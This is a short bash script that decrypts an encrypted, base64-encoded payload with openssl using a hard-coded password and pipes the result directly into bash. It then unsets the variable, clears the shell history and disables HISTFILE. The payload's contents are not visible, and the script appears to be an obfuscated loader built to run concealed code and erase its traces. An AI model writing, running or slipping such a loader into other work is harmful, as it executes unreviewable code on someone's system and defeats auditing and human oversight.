#!/bin/bash
ENC_DATA="U2FsdGVkX1+uqyFWqWwC1VRxEIvYNkgS6rZLYWgCmHNw//n09AtZaDTVAa9CPhv8t6TARzqdqq6YItwxx8PE9lYnPrPW93GDABdumHsNklJFp4BAsuNp3umQ0eFx1bOPRJEyYVoB1v6YKVCyc8tRhl/9/Tm5WApVJY2qCcRCjH/NmHDRsudw2f9/r4nv3AW8nD+vaDRpcfHEIFmpEABcqE1+61Wgd2wo7IGPbjO/ZB5evxsIPziAi5WmG6p7B2MVuToES9+4VVXrJcTkDM/oYlD7iwOEdATMOjqIbxvU23G9NEoy37/luFjKdJk/TGGMNX7AGCC3ovUjzbKAOoVBfDXzKcBh4w1s+90XTtigyVr5p17xXpXFVjY33O2Y5XPZOo5zMDU0GkyybL3D8uQIIxLy9NIv2isJ2AWwsrdYC617hP3nybbwgWqUjfdD7+SjCmttEXknKn7HpfCrqPWL2X8waooCvx7hMWFs8XrhlxK+q3KAgR/Wm64I46nFaTxI4XN0IeUnlktcED7EE+6ynJpQVpmXDgd+dri6Gfw8t/uwhrYfozjzQ5mm/WINxs+gdOkyh4AF8I95QlTTGPTr3w=="

echo "$ENC_DATA" | openssl enc -aes-256-cbc -md sha256 -a -d -salt -pass pass:bismillah 2>/dev/null | bash

unset ENC_DATA
history -c && unset HISTFILE
